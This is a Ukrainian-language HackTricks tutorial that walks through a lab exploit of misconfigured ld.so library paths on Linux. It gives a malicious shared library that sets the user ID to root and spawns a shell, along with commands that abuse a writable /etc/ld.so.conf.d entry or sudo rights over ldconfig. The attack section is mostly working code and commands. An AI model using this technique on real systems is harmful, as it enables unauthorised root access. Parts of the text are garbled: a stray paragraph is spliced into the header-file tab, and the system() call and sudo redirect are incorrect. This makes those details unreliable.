# Приклад використання привілейованого експлойту ld.so

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **та** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

## Підготовка середовища

У наступному розділі ви знайдете код файлів, які ми збираємося використовувати для підготовки середовища

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}Файл **libcustom.h** містить власні бібліотеки, які можуть бути використані для розширення функціональності програми. У цьому файлі можна визначити власні функції та змінні, які будуть доступні для використання в програмі. Рекомендується уважно контролювати доступ до цього файлу, оскільки недостатні обмеження можуть призвести до можливості використання його для зловмисних цілей. {% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
1. **Створіть** ці файли на своєму комп'ютері в тій самій папці
2. **Скомпілюйте** **бібліотеку**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
4. **Скомпілюйте** **виконуваний файл**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** бінарний файл.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Використання

У цьому сценарії ми будемо припускати, що **хтось створив вразливий запис** всередині файлу в _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Вразлива папка - _/home/ubuntu/lib_ (де у нас є права на запис).\
**Завантажте та скомпілюйте** наступний код всередині цього шляху:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Тепер, коли ми **створили зловмисну бібліотеку libcustom всередині неправильного** шляху, нам потрібно зачекати на **перезавантаження** або на виконання користувачем root команди **`ldconfig`** (_у випадку, якщо ви можете виконати цей бінарний файл як **sudo** або він має **suid біт**, ви зможете виконати його самостійно_).

Після цього **перевірте знову**, звідки виконується `sharevuln` виконуваний файл, що завантажує бібліотеку `libcustom.so` з:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як ви можете побачити, він **завантажує його з `/home/ubuntu/lib`** і якщо будь-який користувач виконає його, буде виконано оболонку:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Зверніть увагу, що в цьому прикладі ми не підвищили привілеї, але, змінивши виконувані команди та **чекаючи, коли корінь або інший користувач з підвищеними привілеями виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.
{% endhint %}

### Інші помилки конфігурації - Та ж вразливість

У попередньому прикладі ми симулювали помилкову конфігурацію, де адміністратор **встановив непривілейовану теку всередині файлу конфігурації всередині `/etc/ld.so.conf.d/`**.\
Але є інші помилки конфігурації, які можуть призвести до тієї ж вразливості, якщо у вас є **права на запис** в деякому **файлі конфігурації** всередині `/etc/ld.so.conf.d/`, у теки `/etc/ld.so.conf.d` або у файл `/etc/ld.so.conf`, ви можете налаштувати ту ж вразливість та експлуатувати її.

## Експлойт 2

**Припустимо, у вас є привілеї sudo для `ldconfig`**.\
Ви можете вказати `ldconfig` **звідки завантажувати файли конфігурації**, тому ми можемо скористатися цим, щоб змусити `ldconfig` завантажувати довільні теки.\
Тож, створимо файли та теки, необхідні для завантаження "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як вказано в **попередньому використанні**, **створіть зловісну бібліотеку всередині `/tmp`**.\
І нарешті, давайте завантажимо шлях та перевіримо, звідки завантажується бібліотека:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як ви можете побачити, маючи привілеї sudo над `ldconfig`, ви можете використати цю ж вразливість.**

{% hint style="info" %}
Я **не знайшов** надійного способу використання цієї вразливості, якщо `ldconfig` налаштований з **бітом suid**. З'являється наступна помилка: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## References

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab machine in HTB

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.

</details>
